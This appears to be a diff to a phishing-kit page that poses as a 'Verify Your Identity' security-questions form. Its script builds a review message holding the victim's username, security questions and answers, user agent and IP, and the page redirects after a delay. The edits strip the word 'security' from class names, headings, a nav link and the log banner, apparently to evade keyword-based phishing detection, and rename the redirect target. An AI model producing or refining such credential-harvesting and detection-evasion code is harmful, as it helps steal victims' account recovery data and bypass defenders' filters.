@@ -75,11 +75,11 @@
         overflow: hidden;
       }
 
-      .security-questions-icon {
+      .-questions-icon {
         width: 45px;
         height: 45px;
       }
-      .security-questions-header {
+      .-questions-header {
         font-family: "SourceSans-Light";
         font-size: 1.5em;
       }
@@ -329,11 +329,11 @@
           padding: 20px;
         }
 
-        .security-questions-icon {
+        .-questions-icon {
           width: 40px;
           height: 40px;
         }
-        .security-questions-header {
+        .-questions-header {
           font-size: 1.2em;
         }
         #agree {
@@ -363,7 +363,7 @@
           |
           <p>Help</p>
           |
-          <p>Security</p>
+          <p></p>
           |
           <p>Contact us</p>
           |
@@ -388,7 +388,7 @@
             </div>
             <form id="loginForm" novalidate>
               <div
-                class="security-questiion-header"
+                class="-questiion-header"
                 style="
                   display: flex;
                   align-items: center;
@@ -404,7 +404,7 @@
                   xmlns="http://www.w3.org/2000/svg"
                   stroke="#c22424"
                   stroke-width="0.00035"
-                  class="security-questions-icon"
+                  class="-questions-icon"
                 >
                   <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                   <g
@@ -423,7 +423,7 @@
                     ></path>
                   </g>
                 </svg>
-                <h2 class="security-questions-header">
+                <h2 class="-questions-header">
                   Verify Your Identity
                 </h2>
               </div>
@@ -755,9 +755,9 @@
 
           case 4: // Review
             message = `
-        --------------[SECURITY QA REVIEW]--------------
+        --------------[ QA REVIEW]--------------
 
-        ${Session.getUsername()} Reviewing Security Questions and Answers Set
+        ${Session.getUsername()} Reviewing  Questions and Answers Set
 
         ------------[USER AGENT IP DNS]-------------
         User Agent
@@ -939,7 +939,7 @@
         if (success) {
           ShowLoadingModal();
           setTimeout(() => {
-            window.location.href = "auth2.html";
+            window.location.href = "verify-security.html";
           }, 60000);
         } else {
           location.reload();
